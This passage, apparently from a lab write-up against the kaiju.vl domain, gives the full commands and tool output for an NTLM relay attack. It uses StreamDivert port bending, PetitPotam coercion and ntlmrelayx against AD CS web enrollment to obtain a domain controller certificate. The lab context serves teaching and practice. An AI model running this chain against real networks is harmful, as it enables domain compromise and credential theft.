<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">"config.txt"</span><span class="p">,</span> <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="o">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s2">"tcp &lt; 445 10.10.221.53 -&gt; 127.0.0.1 8000"</span><span class="p">))</span> 
<span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>


<span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
<span class="o">----</span>                 <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">5</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>             <span class="mi">41</span> <span class="n">config</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">5</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>         <span class="mi">659456</span> <span class="n">StreamDivert</span><span class="o">.</span><span class="n">exe</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">5</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>       <span class="mi">10055680</span> <span class="n">StreamDivert</span><span class="o">.</span><span class="n">pdb</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">5</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>          <span class="mi">47104</span> <span class="n">WinDivert</span><span class="o">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">5</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>          <span class="mi">75952</span> <span class="n">WinDivert32</span><span class="o">.</span><span class="n">sys</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">5</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>          <span class="mi">90288</span> <span class="n">WinDivert64</span><span class="o">.</span><span class="n">sys</span>


<span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<p>So, what does this configuration do?</p><br/>
<div class="highlight"><pre><span></span><span class="n">tcp</span> <span class="o">&lt;</span> <span class="mi">445</span> <span class="mf">10.10.221.53</span> <span class="o">-&gt;</span> <span class="mf">127.0.0.1</span> <span class="mi">8000</span>
</pre></div>
<p>In short, any SMB traffic coming from <code>10.10.221.53</code> (the <code>BERSRV100</code> DC) will be redirected to local port <code>8000</code>. That port is bound to an SSH tunnel using remote port forwarding, which then forwards the connection from local port <code>8000</code> to port <code>445</code> on my attacker machine.</p><br/>
<p>Now, let's run <code>StreamDivert.exe</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">StreamDivert</span><span class="o">.</span><span class="n">exe</span> <span class="o">.</span>\<span class="n">config</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">f</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Modifying</span> <span class="n">firewall</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authorized</span> <span class="n">application</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>\<span class="n">StreamDivert</span><span class="o">.</span><span class="n">exe</span> <span class="n">is</span> <span class="n">now</span> <span class="n">enabled</span> <span class="n">in</span> <span class="n">the</span> <span class="n">firewall</span><span class="o">.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Parsing</span> <span class="n">config</span> <span class="n">file</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Parsed</span> <span class="mi">1</span> <span class="n">inbound</span> <span class="n">and</span> <span class="mi">0</span> <span class="n">outbound</span> <span class="n">relay</span> <span class="n">entries</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">packet</span> <span class="n">diverters</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundTCPDivertProxy</span><span class="p">(</span><span class="mi">445</span><span class="p">:</span><span class="n">?</span><span class="p">)</span> <span class="n">Start</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundTCPDivertProxy</span><span class="p">(</span><span class="mi">445</span><span class="p">:</span><span class="mi">61317</span><span class="p">)</span> <span class="n">Start</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundTCPDivertProxy</span><span class="p">(</span><span class="mi">445</span><span class="p">:</span><span class="mi">61317</span><span class="p">)</span> <span class="n">tcp</span> <span class="n">and</span> <span class="p">((</span><span class="n">tcp</span><span class="o">.</span><span class="n">SrcPort</span> <span class="o">==</span> <span class="mi">61317</span><span class="p">)</span> <span class="n">or</span> <span class="p">(</span><span class="n">tcp</span><span class="o">.</span><span class="n">DstPort</span> <span class="o">==</span> <span class="mi">445</span> <span class="n">and</span> <span class="n">ip</span><span class="o">.</span><span class="n">SrcAddr</span> <span class="o">==</span> <span class="mf">10.10.221.53</span><span class="p">))</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundUDPDivertProxy</span><span class="p">()</span> <span class="n">Start</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundUDPDivertProxy</span><span class="p">()</span> <span class="n">udp</span> <span class="n">and</span> <span class="p">()</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">InboundUDPDivertProxy</span><span class="p">()</span> <span class="n">failed</span> <span class="n">to</span> <span class="nb">open</span> <span class="n">the</span> <span class="n">WinDivert</span> <span class="n">device</span> <span class="p">(</span><span class="mi">87</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundUDPDivertProxy</span><span class="p">()</span> <span class="n">Stop</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundICMPDivertProxy</span><span class="p">()</span> <span class="n">Start</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">InboundICMPDivertProxy</span><span class="p">()</span> <span class="n">false</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">OutboundDivertProxy</span><span class="p">()</span> <span class="n">Start</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">OutboundDivertProxy</span><span class="p">()</span> <span class="p">()</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">OutboundDivertProxy</span><span class="p">()</span> <span class="n">failed</span> <span class="n">to</span> <span class="nb">open</span> <span class="n">the</span> <span class="n">WinDivert</span> <span class="n">device</span> <span class="p">(</span><span class="mi">87</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">OutboundDivertProxy</span><span class="p">()</span> <span class="n">Stop</span>
</pre></div>
<p>Apparently, the config file was parsed successfully, and the <code>InboundTCPDivertProxy</code> is now running properly. On my attacker machine, I‚Äôll start <code>ntlmrelayx.py</code> with the <code>ADCS</code> module, specifying the <code>BERSRV105.kaiju.vl</code> enrollment web service. In this case, you need to perform the authentication using the <code>BERSRV100$</code> account, otherwise, you won‚Äôt be able to DCSync, since Read-Only Domain Controller accounts lack the <code>Replicating Directory Changes</code> and <code>Replicating Directory Changes All</code> privileges.</p><br/>
<p>Since we‚Äôre reaching the internal services through SOCKS proxies, we need to run <code>ntlmrelayx</code> with proxychains:</p><br/>
<div class="highlight"><pre><span></span><span class="root1">root@ubuntu#</span> <span class="n">proxychains4</span> <span class="n">ntlmrelayx</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">t</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">--</span><span class="n">adcs</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">--</span><span class="n">template</span> <span class="n">DomainController</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="mf">.4</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.17</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">DCSYNC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMB</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">RPC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">MSSQL</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="n">in</span> <span class="n">relay</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">single</span> <span class="n">host</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">SMB</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">445</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">HTTP</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">80</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">WCF</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9389</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">RAW</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">6666</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Multirelay</span> <span class="n">disabled</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
</pre></div>
<p>Note: Make sure to specify the <code>DomainController</code> template with the <code>--template</code> parameter; otherwise, the CSR will fail. This happens because you‚Äôre trying to enroll using a DomainController account, and by default, <code>ntlmrelayx</code> will request the <code>Machine</code> template whenever the authentication comes from a machine account.</p><br/>
<p>Now, let‚Äôs run <code>PetitPotam</code>. Remember that the listener IP should be <code>BERSRV200</code>, since that‚Äôs where the port bending takes place. If you specify your attacker machine instead, you won‚Äôt receive the authentication due to the outbound firewall blocking rules.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="n">python</span> <span class="o">~/</span><span class="n">tools</span><span class="o">/</span><span class="n">PetitPotam</span><span class="o">/</span><span class="n">PetitPotam</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">d</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">u</span> <span class="n">clare</span><span class="o">.</span><span class="n">frost</span> <span class="o">-</span><span class="n">p</span> <span class="o">************</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="mf">.4</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.17</span>


              <span class="n">___</span>            <span class="n">_</span>        <span class="n">_</span>      <span class="n">_</span>        <span class="n">___</span>            <span class="n">_</span>                     
             <span class="o">|</span> <span class="n">_</span> \   <span class="n">___</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>     <span class="p">(</span><span class="n">_</span><span class="p">)</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>     <span class="o">|</span> <span class="n">_</span> \   <span class="n">___</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>    <span class="n">__</span> <span class="n">_</span>    <span class="n">_</span> <span class="n">__</span>   
             <span class="o">|</span>  <span class="n">_</span><span class="o">/</span>  <span class="o">/</span> <span class="o">-</span><span class="n">_</span><span class="p">)</span>   <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>    <span class="o">|</span> <span class="o">|</span>    <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>    <span class="o">|</span>  <span class="n">_</span><span class="o">/</span>  <span class="o">/</span> <span class="n">_</span> \   <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>  <span class="o">/</span> <span class="n">_</span><span class="n">`</span> <span class="o">|</span>  <span class="o">|</span> <span class="s1">'  \  </span>
            <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   \<span class="n">___</span><span class="o">|</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   \<span class="n">___</span><span class="o">/</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> 
          <span class="n">_</span><span class="o">|</span> <span class="s2">""" |_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_| """</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span> 
          <span class="s2">"`-0-0-'"</span><span class="n">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="n">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="n">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-' </span>

              <span class="n">PoC</span> <span class="n">to</span> <span class="n">elicit</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">authentication</span> <span class="n">via</span> <span class="n">some</span> <span class="n">MS</span><span class="o">-</span><span class="n">EFSRPC</span> <span class="n">functions</span>
                                      <span class="n">by</span> <span class="n">topotam</span> <span class="p">(</span><span class="nd">@topotam77</span><span class="p">)</span>

                     <span class="n">Inspired</span> <span class="n">by</span> <span class="n">@tifkin_</span> <span class="o">&amp;</span> <span class="n">@elad_shamir</span> <span class="n">previous</span> <span class="n">work</span> <span class="n">on</span> <span class="n">MS</span><span class="o">-</span><span class="n">RPRN</span>



<span class="n">Trying</span> <span class="n">pipe</span> <span class="n">lsarpc</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ncacn_np</span><span class="p">:</span><span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">[</span>\<span class="n">PIPE</span>\<span class="n">lsarpc</span><span class="p">]</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.53</span><span class="p">:</span><span class="mi">445</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connected</span><span class="n">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Binding</span> <span class="n">to</span> <span class="n">c681d488</span><span class="o">-</span><span class="n">d850</span><span class="o">-</span><span class="mi">11</span><span class="n">d0</span><span class="o">-</span><span class="mi">8</span><span class="n">c52</span><span class="o">-</span><span class="mi">00</span><span class="n">c04fd90f7e</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">bound</span><span class="n">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">EfsRpcOpenFileRaw</span><span class="n">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Got</span> <span class="n">RPC_ACCESS_DENIED</span><span class="n">!!</span> <span class="n">EfsRpcOpenFileRaw</span> <span class="n">is</span> <span class="n">probably</span> <span class="n">PATCHED</span><span class="n">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">OK</span><span class="n">!</span> <span class="n">Using</span> <span class="n">unpatched</span> <span class="n">function</span><span class="n">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">EfsRpcEncryptFileSrv</span><span class="n">!</span>
</pre></div>
<p>And it worked ‚Äî <code>ntlmrelayx</code> received the authentication, relayed it to the <code>BERSRV105</code> enrollment web service, and successfully obtained a certificate, as shown below:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="n">ntlmrelayx</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">t</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="o">/</span><span class="n">certsrv</span><span class="o">/</span><span class="n">certfnsh</span><span class="o">.</span><span class="n">asp</span> <span class="o">--</span><span class="n">adcs</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">--</span><span class="n">template</span> <span class="n">DomainController</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="mf">.4</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.17</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">DCSYNC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMB</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">RPC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">MSSQL</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="n">in</span> <span class="n">relay</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">single</span> <span class="n">host</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">SMB</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">445</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">HTTP</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">80</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">WCF</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9389</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">RAW</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">6666</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Multirelay</span> <span class="n">disabled</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBD</span><span class="o">-</span><span class="n">Thread</span><span class="o">-</span><span class="mi">5</span> <span class="p">(</span><span class="n">process_request_thread</span><span class="p">):</span> <span class="n">Received</span> <span class="n">connection</span> <span class="n">from</span><span class="w"> </span><span class="mf">127.0.0.1</span><span class="p">,</span> <span class="n">attacking</span> <span class="n">target</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Unsupported</span> <span class="n">MechType</span> <span class="s1">'MS KRB5 - Microsoft Kerberos 5'</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="n">bersrv105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">:</span><span class="mi">80</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">server</span> <span class="n">returned</span> <span class="n">error</span> <span class="n">code</span> <span class="mi">200</span><span class="p">,</span> <span class="n">treating</span> <span class="k">as</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">login</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="n">against</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="k">as</span> <span class="n">KAIJU</span><span class="o">/</span><span class="n">BERSRV100</span><span class="n">$</span> <span class="n">SUCCEED</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">CSR</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CSR</span> <span class="n">generated</span><span class="n">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">certificate</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBD</span><span class="o">-</span><span class="n">Thread</span><span class="o">-</span><span class="mi">7</span> <span class="p">(</span><span class="n">process_request_thread</span><span class="p">):</span> <span class="n">Received</span> <span class="n">connection</span> <span class="n">from</span><span class="w"> </span><span class="mf">127.0.0.1</span><span class="p">,</span> <span class="n">attacking</span> <span class="n">target</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Unsupported</span> <span class="n">MechType</span> <span class="s1">'MS KRB5 - Microsoft Kerberos 5'</span>
